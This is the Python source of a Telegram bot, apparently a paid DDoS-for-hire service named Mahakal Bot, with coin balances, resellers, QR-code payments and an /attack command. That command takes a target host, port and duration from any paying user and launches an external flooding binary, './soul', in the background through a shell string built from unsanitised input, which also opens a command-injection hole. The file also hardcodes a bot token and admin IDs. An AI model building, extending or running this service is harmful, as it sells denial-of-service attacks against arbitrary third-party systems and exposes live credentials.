import json
import datetime
import subprocess
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.ext import MessageHandler, filters
import asyncio
import subprocess

TOKEN = "7026678876:AAFfUEgmdEJzUBg30JSUauBg2kNayUBcGu0"
GROUP_ID = -1002464533692
ADMIN_IDS = ["5056902784", "757915155"]
ATTACK_COST = 5
MAX_ATTACK_DURATION = 240
RESELLER_COST = 10
attack_cooldown = {}

# Payment System Config
OWNERS = ["5056902784", "757915155"]  # Owner ke Telegram ID
PAYMENT_GROUP_ID = -1002302681156  # Payment notification group ID
pending_payments = {}  # Store pending payments
awaiting_confirmation = {}  # Store payments awaiting admin confirmation
QR_CODE_PATH = "IMG_20250304_231447_760.jpg"  # QR Code image path

# Ensure users.json exists
if not os.path.exists("users.json"):
    with open("users.json", "w") as f:
        json.dump({}, f)

def load_users():
    with open("users.json", "r") as f:
        return json.load(f)

def save_users(users):
    with open("users.json", "w") as f:
        json.dump(users, f, indent=4)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome to Mahakal Bot! Use commands to interact.")

async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only admins can add resellers!")
        return

    command = update.message.text.split()
    if len(command) != 3:
        await update.message.reply_text("📌 Usage: /addreseller <user_id> <coins>")
        return
    
    reseller_id, coins = command[1], command[2]
    
    if not coins.isdigit():
        await update.message.reply_text("⚠️ Error: Coins must be a number!")
        return
    
    coins = int(coins)
    
    users = load_users()
    users[reseller_id] = {"role": "reseller", "coins": coins}
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"🛠️ **Admin Action:** Added new reseller!\n👤 Reseller ID: {reseller_id}\n💰 Coins: {coins}")
    await update.message.reply_text(f"✅ Reseller {reseller_id} added with {coins} coins!")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    users = load_users()

    if user_id not in users or not isinstance(users[user_id], dict) or users[user_id].get("role") != "reseller":
        await update.message.reply_text("❌ Only resellers can add users!")
        return

    if users[user_id]["coins"] < RESELLER_COST:
        await update.message.reply_text("⚠️ Not enough coins! Ask admin for more.")
        return

    command = update.message.text.split()
    if len(command) != 3:
        await update.message.reply_text("📌 Usage: /mahakal <user_id> <coins>")
        return
    
    new_user_id, coins = command[1], command[2]
    
    if not coins.isdigit():
        await update.message.reply_text("⚠️ Error: Coins must be a number!")
        return
    
    coins = int(coins)
    
    if new_user_id in users:
        await update.message.reply_text(f"⚠️ User {new_user_id} already exists!")
        return

    users[new_user_id] = {"role": "user", "coins": coins}
    users[user_id]["coins"] -= RESELLER_COST
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"👤 **New User Added!**\n🔹 Reseller: {user_id}\n🔹 User ID: {new_user_id}\n💰 Coins: {coins}")
    await update.message.reply_text(f"✅ User {new_user_id} added with {coins} coins!")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    users = load_users()

    if user_id not in users and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only resellers and admins can remove users!")
        return

    command = update.message.text.split()
    if len(command) != 2:
        await update.message.reply_text("📌 Usage: /removeuser <user_id>")
        return

    target_user = command[1]

    if target_user not in users:
        await update.message.reply_text("⚠️ Error: User does not exist!")
        return

    if user_id not in ADMIN_IDS:
        if users[user_id]["role"] != "reseller":
            await update.message.reply_text("❌ Only resellers and admins can remove users!")
            return
        if users[target_user]["role"] == "reseller":
            await update.message.reply_text("⚠️ Resellers cannot remove other resellers!")
            return

    del users[target_user]
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"🗑 **User Removed!**\n🔹 User ID: {target_user}")
    await update.message.reply_text(f"✅ Successfully removed user {target_user}!")

async def export_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only admins can use this command!")
        return

    await update.message.reply_document(document=open("users.json", "rb"))

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only admins can use /broadcast!")
        return

    if not context.args:
        await update.message.reply_text("📌 Usage: /broadcast <message>")
        return

    message = " ".join(context.args)
    users = load_users()

    for uid in users.keys():
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 **Broadcast:** {message}")
        except:
            pass

    await context.bot.send_message(GROUP_ID, f"📢 **Admin Broadcast Sent:**\n\n{message}")
    await update.message.reply_text("✅ Broadcast sent successfully!")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    username = update.message.from_user.username or "Unknown"
    users = load_users()

    if user_id not in ADMIN_IDS and user_id not in users:
        await update.message.reply_text("❌ Unauthorized! Buy access from admin.")
        return

    if user_id not in ADMIN_IDS and users[user_id]["coins"] < ATTACK_COST:
        await update.message.reply_text("❌ Tere coins khatam ho gaye hain! Mahakal se buy kar.")
        return

    command = update.message.text.split()
    if len(command) != 4:
        await update.message.reply_text("📌 Usage: /attack <target> <port> <time>")
        return
    
    target, port, attack_time = command[1], command[2], command[3]

    if not port.isdigit() or not attack_time.isdigit():
        await update.message.reply_text("⚠️ Error: Port and Time must be numbers.")
        return

    port, attack_time = int(port), int(attack_time)

    if attack_time > MAX_ATTACK_DURATION:
        await update.message.reply_text(f"⏳ Max attack time is {MAX_ATTACK_DURATION} sec.")
        return

    coins_deducted = ATTACK_COST if user_id not in ADMIN_IDS else 0
    remaining_coins = users[user_id]["coins"] - coins_deducted if user_id not in ADMIN_IDS else "Unlimited"

    if user_id not in ADMIN_IDS:
        users[user_id]["coins"] -= coins_deducted
        save_users(users)

    await update.message.reply_text(
        f"✅ **Attack Started!**\n🎯 Target: `{target}`\n🔌 Port: `{port}`\n⏳ Duration: `{attack_time} sec`\n💰 Coins Deducted: `{coins_deducted}`\n💰 Remaining Coins: `{remaining_coins}`\n\n⚠️ Please wait until the attack completes."
    )

    await context.bot.send_message(
        GROUP_ID, 
        f"⚡ **Attack Alert** ⚡\n👤 User: @{username} (ID: `{user_id}`)\n🎯 Target: `{target}`\n🔌 Port: `{port}`\n⏳ Duration: `{attack_time} sec`\n💰 Coins Deducted: `{coins_deducted}`\n💰 Remaining Coins: `{remaining_coins}`"
    )

    # Run attack in background
    subprocess.Popen(f"nohup ./soul {target} {port} {attack_time} 900 > /dev/null 2>&1 &", shell=True)

    # ✅ Attack complete hone ka wait background me rakho
    asyncio.create_task(attack_completed_message(update, target, port, attack_time))

async def attack_completed_message(update: Update, target: str, port: int, attack_time: int):
    await asyncio.sleep(attack_time)

    # ✅ Attack complete hone ke baad sirf user ko message bhejo (GROUP ME NAHI)
    try:
        await update.message.reply_text(f"✅ **Attack Completed!**\n🎯 Target: `{target}`\n🔌 Port: `{port}`\n⏳ Duration: `{attack_time} sec`")

    except Exception as e:
        print(f"⚠️ Error in sending attack completion message: {e}")

async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    users = load_users()

    if user_id not in users and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only resellers and admins can top up users.")
        return

    command = update.message.text.split()
    if len(command) != 3:
        await update.message.reply_text("📌 Usage: /topup <user_id> <coins>")
        return

    target_user, coins = command[1], command[2]

    if not coins.isdigit():
        await update.message.reply_text("⚠️ Error: Coins must be a number!")
        return

    coins = int(coins)

    if target_user not in users:
        await update.message.reply_text("⚠️ Error: User does not exist!")
        return

    if user_id not in ADMIN_IDS:
        if users[user_id]["role"] != "reseller":
            await update.message.reply_text("❌ Only resellers and admins can top up users!")
            return
        if users[target_user]["role"] == "reseller":
            await update.message.reply_text("⚠️ Resellers cannot top up other resellers!")
            return
        if users[user_id]["coins"] < coins:
            await update.message.reply_text("⚠️ Not enough coins!")
            return
        users[user_id]["coins"] -= coins  

    users[target_user]["coins"] += coins
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"💰 **Top-Up Alert** 💰\n\nUser: {target_user} received {coins} coins from {user_id}.")
    await update.message.reply_text(f"✅ Successfully topped up {coins} coins to {target_user}!")

async def takecoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    users = load_users()

    if user_id not in users and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only resellers and admins can take back coins.")
        return

    command = update.message.text.split()
    if len(command) != 3:
        await update.message.reply_text("📌 Usage: /takecoins <user_id> <coins>")
        return

    target_user, coins = command[1], command[2]

    if not coins.isdigit():
        await update.message.reply_text("⚠️ Error: Coins must be a number!")
        return

    coins = int(coins)

    if target_user not in users:
        await update.message.reply_text("⚠️ Error: User does not exist!")
        return

    if users[target_user]["coins"] < coins:
        await update.message.reply_text("⚠️ User does not have enough coins!")
        return

    if user_id not in ADMIN_IDS:
        if users[user_id]["role"] != "reseller":
            await update.message.reply_text("❌ Only resellers and admins can take back coins!")
            return
        if users[target_user]["role"] == "reseller":
            await update.message.reply_text("⚠️ Resellers cannot take coins from other resellers!")
            return
        users[user_id]["coins"] += coins  

    users[target_user]["coins"] -= coins
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"💰 **Coins Taken Back!** 💰\n\nUser: {user_id} took {coins} coins from {target_user}.")
    await update.message.reply_text(f"✅ Successfully took back {coins} coins from {target_user}!")

async def payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)

    if not os.path.exists(QR_CODE_PATH):
        await update.message.reply_text("❌ QR Code file not found!")
        return

    # Send QR Code
    await update.message.reply_photo(
        photo=open(QR_CODE_PATH, "rb"),  # Load QR code from local file
        caption="🛒 **Payment System**\n\n✅ Scan the QR Code to make a payment.\n📸 After payment, send a screenshot and transaction ID.\n\n💰 Your coins will be added after verification!"
    )

    # Ask for screenshot and transaction ID
    pending_payments[user_id] = True
    await update.message.reply_text("📤 Please send the **screenshot** of payment along with **Transaction ID**.")

async def receive_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    username = update.message.from_user.username or "Unknown"

    if user_id not in pending_payments:
        return

    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or "No Transaction ID provided."

        payment_message = (
            f"🆕 **New Payment Received!**\n"
            f"👤 **User:** @{username}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📜 **Transaction ID:** `{caption}`\n\n"
            f"✅ Use `/confirmpayment {user_id}` to confirm."
        )

        # Notify owners
        for owner in OWNERS:
            try:
                await context.bot.send_photo(chat_id=owner, photo=photo, caption=payment_message)
            except:
                pass
        
        # Send payment notification to group
        await context.bot.send_photo(chat_id=PAYMENT_GROUP_ID, photo=photo, caption=payment_message)

        # Inform user to wait for confirmation
        awaiting_confirmation[user_id] = True
        await update.message.reply_text("⏳ **Please wait for payment confirmation.**\nAn admin will verify your payment soon.")

        del pending_payments[user_id]

    else:
        await update.message.reply_text("⚠️ Please send a valid **screenshot** of the payment!")

async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)

    if user_id not in OWNERS:
        await update.message.reply_text("❌ Only owners can confirm payments!")
        return

    command = update.message.text.split()
    if len(command) != 2:
        await update.message.reply_text("📌 Usage: /confirmpayment <user_id>")
        return

    target_user = command[1]

    if target_user not in awaiting_confirmation:
        await update.message.reply_text("⚠️ No pending payment found for this user!")
        return

    # Send confirmation message to user
    try:
        await context.bot.send_message(chat_id=target_user, text="✅ **Your payment is successfully completed!**")
    except:
        pass

    del awaiting_confirmation[target_user]
    await update.message.reply_text(f"✅ Payment confirmed for user `{target_user}`.")

app = Application.builder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("addreseller", add_reseller))
app.add_handler(CommandHandler("mahakal", add_user))
app.add_handler(CommandHandler("removeuser", remove_user))
app.add_handler(CommandHandler("mahakalusers", export_users))
app.add_handler(CommandHandler("broadcast", broadcast))
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("topup", topup))
app.add_handler(CommandHandler("takecoins", takecoins))
app.add_handler(CommandHandler("payment", payment))
app.add_handler(MessageHandler(filters.PHOTO, receive_payment))
app.add_handler(CommandHandler("confirmpayment", confirm_payment))

app.run_polling()
